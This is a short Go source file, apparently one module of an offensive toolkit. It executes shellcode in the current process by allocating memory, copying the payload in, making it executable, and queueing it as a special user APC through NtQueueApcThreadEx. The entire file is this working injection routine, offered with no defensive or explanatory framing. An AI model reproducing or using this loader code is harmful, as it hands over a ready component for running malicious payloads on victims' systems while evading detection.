package injection

import (
	"unsafe"
)

const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLGAS_MAX_VALUE
)

func NtQueueApcThread() {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := GetCurrentThread.Call()

	NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
}
